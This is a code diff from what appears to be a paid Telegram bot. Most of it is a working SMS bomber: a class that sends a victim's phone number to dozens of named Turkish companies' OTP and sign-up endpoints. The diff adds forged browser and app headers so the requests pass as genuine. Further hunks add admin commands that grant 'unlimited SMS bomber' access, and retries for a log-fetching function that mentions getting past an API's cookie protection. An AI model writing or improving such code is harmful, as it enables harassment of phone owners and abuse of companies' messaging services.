@@ -3399,8 +3399,26 @@ def log_fetch(domain, limit=None):
 
         session = requests.Session()
 
+        def _do_get(prms, tries=3):
+            last_err = None
+            for attempt in range(1, tries + 1):
+                try:
+                    return session.get(LOG_API_BASE, params=prms, headers=headers, timeout=(15, 120))
+                except requests.exceptions.Timeout as e:
+                    last_err = e
+                    print(f"[LOG] timeout attempt {attempt}/{tries} domain={domain}")
+                    time.sleep(1.5 * attempt)
+                except requests.exceptions.ConnectionError as e:
+                    last_err = e
+                    print(f"[LOG] conn attempt {attempt}/{tries} domain={domain}")
+                    time.sleep(1.5 * attempt)
+            if last_err:
+                raise last_err
+            raise requests.exceptions.Timeout("log api")
+
         # 1) İlk istek — genelde AES cookie HTML
-        r = session.get(LOG_API_BASE, params=params, headers=headers, timeout=60)
+        r = _do_get(params)
+
         print(f"[LOG] first {domain} status={r.status_code} len={len(r.text)}")
         text = (r.text or "").strip()
         if not text:
@@ -3412,7 +3430,7 @@ def log_fetch(domain, limit=None):
                 return False, "❌ API koruması aşılamadı (cookie)."
             params_retry = dict(params)
             params_retry["i"] = "1"
-            r = session.get(LOG_API_BASE, params=params_retry, headers=headers, timeout=60)
+            r = _do_get(params_retry)
             print(f"[LOG] retry {domain} status={r.status_code} len={len(r.text)}")
             text = (r.text or "").strip()
             if not text:
@@ -3465,7 +3483,7 @@ def log_fetch(domain, limit=None):
 
         return True, text
     except requests.exceptions.Timeout:
-        return False, "⏰ API zaman aşımı. Tekrar dene."
+        return False, "⏰ API zaman aşımı (sunucu yavaş). Biraz bekleyip tekrar dene."
     except requests.exceptions.ConnectionError:
         return False, "🌐 API bağlantı hatası."
     except Exception as e:
@@ -4445,10 +4463,15 @@ class SendSms:
     def KahveDunyasi(self):
         try:
             url = "https://api.kahvedunyasi.com:443/api/v1/auth/account/register/phone-number"
-            headers = {"User-Agent":"Mozilla/5.0","Content-Type":"application/json","X-Language-Id":"tr-TR","X-Client-Platform":"web","Origin":"https://www.kahvedunyasi.com","Dnt":"1"}
-            r = requests.post(url, headers=headers, json={"countryCode":"90","phoneNumber":self.phone}, timeout=6)
-            if r.json().get("processStatus") == "Success": self.adet += 1
-        except: pass
+            headers = {"User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0","Accept":"application/json, text/plain, */*","Content-Type":"application/json","X-Language-Id":"tr-TR","X-Client-Platform":"web","Origin":"https://www.kahvedunyasi.com","Referer":"https://www.kahvedunyasi.com/"}
+            r = requests.post(url, headers=headers, json={"countryCode":"90","phoneNumber":self.phone}, timeout=10)
+            if r.json().get("processStatus") == "Success":
+                self._ok("KahveDunyasi")
+            else:
+                self._fail("KahveDunyasi")
+        except Exception:
+            self._fail("KahveDunyasi")
+
     def Wmf(self):
         try:
             r = requests.post("https://www.wmf.com.tr/users/register/",
@@ -4840,11 +4863,16 @@ class SendSms:
         except: pass
     def Englishhome(self):
         try:
-            r = requests.post("https://www.englishhome.com:443/api/member/sendOtp",
-                json={"Phone":self.phone,"XID":""},
-                headers={"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:135.0)"}, timeout=6)
-            if r.json().get("isError") == False: self.adet += 1
-        except: pass
+            url = "https://www.englishhome.com:443/api/member/sendOtp"
+            headers = {"User-Agent":"Mozilla/5.0","Accept":"*/*","Referer":"https://www.englishhome.com/","Content-Type":"application/json","Origin":"https://www.englishhome.com"}
+            r = requests.post(url, headers=headers, json={"Phone":self.phone,"XID":""}, timeout=10)
+            if r.json().get("isError") is False:
+                self._ok("Englishhome")
+            else:
+                self._fail("Englishhome")
+        except Exception:
+            self._fail("Englishhome")
+
     def Suiste(self):
         try:
             r = requests.post("https://suiste.com:443/api/auth/code",
@@ -4854,9 +4882,15 @@ class SendSms:
         except: pass
     def KimGb(self):
         try:
-            r = requests.post("https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com:443/api/auth/send-otp", json={"msisdn":"90"+self.phone}, timeout=6)
-            if r.status_code == 200: self.adet += 1
-        except: pass
+            r = requests.post("https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com:443/api/auth/send-otp",
+                json={"msisdn":f"90{self.phone}"}, timeout=10)
+            if r.status_code == 200:
+                self._ok("KimGb")
+            else:
+                self._fail("KimGb")
+        except Exception:
+            self._fail("KimGb")
+
     def Evidea(self):
         try:
             r = requests.post("https://www.evidea.com:443/users/register/",
@@ -4897,9 +4931,16 @@ class SendSms:
         except: pass
     def Metro(self):
         try:
-            r = requests.post("https://mobile.metro-tr.com:443/api/mobileAuth/validateSmsSend", json={"methodType":"2","mobilePhoneNumber":self.phone}, timeout=6)
-            if r.json().get("status") == "success": self.adet += 1
-        except: pass
+            url = "https://mobile.metro-tr.com:443/api/mobileAuth/validateSmsSend"
+            headers = {"Accept":"*/*","Content-Type":"application/json; charset=utf-8","Applicationversion":"2.4.1","Applicationplatform":"2","User-Agent":"Metro Turkiye/2.4.1 (com.mcctr.mobileapplication; build:4; iOS 15.8.3) Alamofire/4.9.1"}
+            r = requests.post(url, headers=headers, json={"methodType":"2","mobilePhoneNumber":self.phone}, timeout=10)
+            if r.json().get("status") == "success":
+                self._ok("Metro")
+            else:
+                self._fail("Metro")
+        except Exception:
+            self._fail("Metro")
+
     def File(self):
         try:
             r = requests.post("https://api.filemarket.com.tr:443/v1/otp/send", json={"mobilePhoneNumber":"90"+self.phone}, timeout=6)
@@ -4917,9 +4958,16 @@ class SendSms:
         except: pass
     def Komagene(self):
         try:
-            r = requests.post("https://gateway.komagene.com.tr:443/auth/auth/smskodugonder", json={"FirmaId":32,"Telefon":self.phone}, timeout=6)
-            if r.json().get("Success") == True: self.adet += 1
-        except: pass
+            url = "https://gateway.komagene.com.tr:443/auth/auth/smskodugonder"
+            headers = {"User-Agent":"Mozilla/5.0","Accept":"*/*","Referer":"https://www.komagene.com.tr/","Anonymousclientid":"0dbf392b-ab10-48b3-5cda-31f3c19816e6","Firmaid":"32","Content-Type":"application/json","Origin":"https://www.komagene.com.tr"}
+            r = requests.post(url, headers=headers, json={"FirmaId":32,"Telefon":self.phone}, timeout=10)
+            if r.json().get("Success") is True:
+                self._ok("Komagene")
+            else:
+                self._fail("Komagene")
+        except Exception:
+            self._fail("Komagene")
+
     def Porty(self):
         try:
             r = requests.post("https://panel.porty.tech:443/api.php?",
@@ -4939,10 +4987,16 @@ class SendSms:
         except: pass
     def Yapp(self):
         try:
-            r = requests.post("https://yapp.com.tr:443/api/mobile/v1/register",
-                json={"app_version":"1.1.5","code":"tr","device_model":"iPhone8,5","device_name":"Memati","device_type":"I","device_version":"15.8.3","email":self.mail,"firstname":"Memati","is_allow_to_communication":"1","language_id":"2","lastname":"Bas","phone_number":self.phone,"sms_code":""}, timeout=6)
-            if r.status_code == 200: self.adet += 1
-        except: pass
+            url = "https://yapp.com.tr:443/api/mobile/v1/register"
+            headers = {"Accept":"application/json","Content-Type":"application/json","X-Content-Language":"en","User-Agent":"YappApp/1.1.5 (iPhone; iOS 15.8.3; Scale/3.00)"}
+            r = requests.post(url, headers=headers, json={"app_version":"1.1.5","code":"tr","device_model":"iPhone8,5","device_name":"Memati","device_type":"I","device_version":"15.8.3","email":self.mail,"firstname":"Memati","is_allow_to_communication":"1","language_id":"2","lastname":"Bas","phone_number":self.phone,"sms_code":""}, timeout=10)
+            if r.status_code == 200:
+                self._ok("Yapp")
+            else:
+                self._fail("Yapp")
+        except Exception:
+            self._fail("Yapp")
+
     def YilmazTicaret(self):
         try:
             formatted = f"0 ({self.phone[:3]}) {self.phone[3:6]} {self.phone[6:8]} {self.phone[8:]}"
@@ -4960,9 +5014,16 @@ class SendSms:
         except: pass
     def Dominos(self):
         try:
-            r = requests.post("https://frontend.dominos.com.tr:443/api/customer/sendOtpCode", json={"email":self.mail,"isSure":False,"mobilePhone":self.phone}, timeout=6)
-            if r.json().get("isSuccess") == True: self.adet += 1
-        except: pass
+            url = "https://frontend.dominos.com.tr:443/api/customer/sendOtpCode"
+            headers = {"Content-Type":"application/json;charset=utf-8","Accept":"application/json, text/plain, */*","Appversion":"IOS-7.1.0","User-Agent":"Dominos/7.1.0 CFNetwork/1335.0.3.4 Darwin/21.6.0","Servicetype":"CarryOut"}
+            r = requests.post(url, headers=headers, json={"email":self.mail,"isSure":False,"mobilePhone":self.phone}, timeout=10)
+            if r.json().get("isSuccess") is True:
+                self._ok("Dominos")
+            else:
+                self._fail("Dominos")
+        except Exception:
+            self._fail("Dominos")
+
     def Baydoner(self):
         try:
             r = requests.post("https://crmmobil.baydoner.com:7004/Api/Customers/AddCustomerTemp",
@@ -4989,9 +5050,16 @@ class SendSms:
         except: pass
     def KofteciYusuf(self):
         try:
-            r = requests.post("https://gateway.poskofteciyusuf.com:1283/auth/auth/smskodugonder", json={"FirmaId":82,"Telefon":self.phone}, timeout=6)
-            if r.json().get("Success") == True: self.adet += 1
-        except: pass
+            url = "https://gateway.poskofteciyusuf.com:1283/auth/auth/smskodugonder"
+            headers = {"Content-Type":"application/json; charset=utf-8","Accept":"application/json","Ostype":"iOS","Appversion":"4.0.4.0","Firmaid":"82","User-Agent":"YemekPosMobil/53 CFNetwork/1335.0.3.4 Darwin/21.6.0"}
+            r = requests.post(url, headers=headers, json={"FireBaseCihazKey":None,"FirmaId":82,"GuvenlikKodu":None,"Telefon":self.phone}, timeout=10)
+            if r.json().get("Success") is True:
+                self._ok("KofteciYusuf")
+            else:
+                self._fail("KofteciYusuf")
+        except Exception:
+            self._fail("KofteciYusuf")
+
     def Little(self):
         try:
             r = requests.post("https://api.littlecaesars.com.tr:443/api/web/Member/Register",
@@ -5007,10 +5075,16 @@ class SendSms:
         except: pass
     def Coffy(self):
         try:
-            r = requests.post("https://user-api-gw.coffy.com.tr:443/user/signup",
-                json={"countryCode":"90","gsm":self.phone,"isKVKKAgreementApproved":True,"isUserAgreementApproved":True,"name":"Memati Bas"}, timeout=6)
-            if r.status_code == 200: self.adet += 1
-        except: pass
+            url = "https://user-api-gw.coffy.com.tr:443/user/signup"
+            headers = {"Accept":"application/json, text/plain, */*","Content-Type":"application/json","Language":"tr","User-Agent":"coffy/5 CFNetwork/1335.0.3.4 Darwin/21.6.0"}
+            r = requests.post(url, headers=headers, json={"countryCode":"90","gsm":self.phone,"isKVKKAgreementApproved":True,"isUserAgreementApproved":True,"name":"Memati Bas"}, timeout=10)
+            if r.status_code == 200:
+                self._ok("Coffy")
+            else:
+                self._fail("Coffy")
+        except Exception:
+            self._fail("Coffy")
+
     def Hamidiye(self):
         try:
             r = requests.post("https://bayi.hamidiye.istanbul:3400/hamidiyeMobile/send-otp", json={"isGuest":False,"phone":self.phone}, timeout=6)
@@ -5018,20 +5092,39 @@ class SendSms:
         except: pass
     def Money(self):
         try:
-            formatted = f"{self.phone[:3]} {self.phone[3:10]}"
-            r = requests.post("https://www.money.com.tr:443/Account/ValidateAndSendOTP", data={"phone":formatted,"GRecaptchaResponse":""}, timeout=6)
-            if r.json().get("resultType") == 0: self.adet += 1
-        except: pass
+            url = "https://www.money.com.tr/Account/ValidateAndSendOTP"
+            headers = {"User-Agent":"Mozilla/5.0","Accept":"*/*","Referer":"https://www.money.com.tr/money-kartiniz-var-mi","Content-Type":"application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With":"XMLHttpRequest","Origin":"https://www.money.com.tr"}
+            data = {"phone": f"{self.phone[:3]} {self.phone[3:10]}", "GRecaptchaResponse": ""}
+            r = requests.post(url, headers=headers, data=data, timeout=10)
+            if r.json().get("resultType") == 0:
+                self._ok("Money")
+            else:
+                self._fail("Money")
+        except Exception:
+            self._fail("Money")
+
     def Alixavien(self):
         try:
-            r = requests.post("https://www.alixavien.com.tr:443/api/member/sendOtp", json={"Phone":self.phone,"XID":""}, timeout=6)
-            if r.json().get("isError") == False: self.adet += 1
-        except: pass
+            url = "https://www.alixavien.com.tr:443/api/member/sendOtp"
+            headers = {"User-Agent":"Mozilla/5.0","Accept":"*/*","Referer":"https://www.alixavien.com.tr/","Content-Type":"application/json","Origin":"https://www.alixavien.com.tr"}
+            r = requests.post(url, headers=headers, json={"Phone":self.phone,"XID":""}, timeout=10)
+            if r.json().get("isError") is False:
+                self._ok("Alixavien")
+            else:
+                self._fail("Alixavien")
+        except Exception:
+            self._fail("Alixavien")
+
     def Jimmykey(self):
         try:
-            r = requests.post(f"https://www.jimmykey.com:443/tr/p/User/SendConfirmationSms?gsm={self.phone}&gRecaptchaResponse=undefined", timeout=6)
-            if r.json().get("Sonuc") == True: self.adet += 1
-        except: pass
+            r = requests.post(f"https://www.jimmykey.com:443/tr/p/User/SendConfirmationSms?gsm={self.phone}&gRecaptchaResponse=undefined", timeout=10)
+            if r.json().get("Sonuc") is True:
+                self._ok("Jimmykey")
+            else:
+                self._fail("Jimmykey")
+        except Exception:
+            self._fail("Jimmykey")
+
     def Ido(self):
         try:
             r = requests.post("https://api.ido.com.tr:443/idows/v2/register",
@@ -6065,6 +6158,7 @@ def register_handlers(bot_instance):
             _btn("📋 TG-ID Logları","adm_tgid_logs"),
             _btn("💰 TG-ID Satın Almalar","adm_tgid_purchases"),
             _btn("📂 LOG Premium Ver","adm_log_give"),
+            _btn("💣 SMS Premium Ver","adm_sms_give"),
             _btn("😈 SearchX Premium Ver","adm_lmnx_give"),
             _btn("🎨 AI Image Bakiye Ver","adm_aiimg_give"),
             _btn("➖ AI Image Bakiye Al","adm_aiimg_take"),
@@ -6164,6 +6258,10 @@ def register_handlers(bot_instance):
             if action == "adm_log_give":
                 USER_STATES.pop(uid, None)
                 _admin_log_give_user(msg, bot_instance)
+                return
+            if action == "adm_sms_give":
+                USER_STATES.pop(uid, None)
+                _admin_sms_give_user(msg, bot_instance)
                 return
             if action == "adm_aiimg_give":
                 USER_STATES.pop(uid, None)
@@ -8837,13 +8935,25 @@ def _handle_admin_cb(call, action, bot_instance):
             )
             return
         elif action == "log_give":
-
             try: bot_instance.answer_callback_query(call.id)
             except: pass
             USER_STATES[uid] = {"action": "adm_log_give"}
             bot_instance.send_message(
                 cid,
                 "📂 <b>LOG Premium Ver</b>\nTelegram ID gir:\n<code>123456789</code>",
+                parse_mode="HTML"
+            )
+            return
+        elif action == "sms_give":
+            try: bot_instance.answer_callback_query(call.id)
+            except: pass
+            USER_STATES[uid] = {"action": "adm_sms_give"}
+            bot_instance.send_message(
+                cid,
+                "💣 <b>SMS Bomber Premium Ver</b>\n"
+                "Kullanıcı Telegram ID gir (önerilen):\n"
+                "<code>123456789</code>\n\n"
+                "Sınırsız SMS bomber hakkı verilir.",
                 parse_mode="HTML"
             )
             return
@@ -9011,6 +9121,39 @@ def _admin_remove(msg, bot_instance):
     if is_premium_lmnx(tid): remove_premium_lmnx(tid); removed.append("LMNX")
     if removed: bot_instance.reply_to(msg, f"✅ @{tuname or tid} {', '.join(removed)} Premium kaldırıldı!")
     else: bot_instance.reply_to(msg, f"ℹ️ @{tuname or tid} zaten Premium değil!")
+
+def _admin_sms_give_user(msg, bot_instance):
+    if msg.from_user.id != ADMIN_ID:
+        return
+    tid, tuname = _resolve_target((msg.text or "").strip())
+    if not tid:
+        bot_instance.reply_to(msg, "❌ Kullanıcı bulunamadı! ID veya @username gir.")
+        return
+    add_user(tid, tuname or "", "")
+    if set_premium_sms(tid, tuname or str(tid), days=None, package_label="Admin SMS Sinirsiz"):
+        left = sms_access_left(tid)
+        bot_instance.reply_to(
+            msg,
+            f"✅ <b>SMS Bomber Premium verildi!</b>\n"
+            f"📦 Paket: <b>Sınırsız</b>\n"
+            f"⏱ Süre: <b>{left}</b>\n"
+            f"👤 @{tuname or tid}\n"
+            f"🆔 <code>{tid}</code>",
+            parse_mode="HTML"
+        )
+        try:
+            bot_instance.send_message(
+                tid,
+                "🎁 <b>Admin sana SMS Bomber Premium verdi!</b>\n"
+                "💣 Sınırsız kullanım aktif.\n"
+                "Araçlar → SMS Bomber",
+                parse_mode="HTML"
+            )
+        except Exception:
+            pass
+    else:
+        bot_instance.reply_to(msg, "❌ SMS Premium verilemedi.")
+
 
 def _admin_log_give_user(msg, bot_instance):
     if msg.from_user.id != ADMIN_ID: return
